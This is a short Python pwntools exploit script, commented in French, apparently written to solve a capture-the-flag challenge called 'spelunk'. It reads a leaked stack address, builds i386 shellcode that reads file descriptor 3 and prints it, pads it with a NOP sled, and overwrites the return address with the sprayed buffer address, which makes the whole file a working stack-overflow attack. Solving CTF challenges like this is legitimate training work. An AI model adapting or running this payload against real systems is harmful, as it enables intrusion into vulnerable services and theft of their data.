from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

host = 'spelunk.37b17c399f3c1226.challenge.zone'
port = 1337
io = remote(host, port)

# --- 1. Récupérer le leak ---
io.recvuntil(b"map at: ")
leak = io.recvline().strip()
buf_addr = int(leak, 16)
log.success(f"Adresse de buf : {hex(buf_addr)}")

# --- 2. Générer le Shellcode ---
sc_assembly = shellcraft.read(3, 'esp', 100)
sc_assembly += shellcraft.write(1, 'esp', 100)
shellcode = asm(sc_assembly)

# --- 3. Construire le Payload "Sprayed" ---
# ljust(120, b'\x90') remplit le vide après le shellcode avec des NOPs (\x90) 
# Les NOPs sont des instructions "vides" qui ne font rien, pour atteindre 120 octets proprement.
payload = shellcode.ljust(120, b'\x90')

# On spamme l'adresse de notre buffer 10 fois (soit 40 octets). 
# Cela va couvrir l'espace de 120 à 160 octets sur la pile.
# L'EIP sera obligatoirement écrasé correctement !
payload += p32(buf_addr) * 10 

# --- 4. Envoyer l'attaque ---
log.info("Envoi du payload ajusté...")
io.sendlineafter(b"What did you find? ", payload)

# --- 5. Lire la réponse ---
io.recvline() 
io.recvline() 

log.success("Croisons les doigts...")
io.interactive()
                    
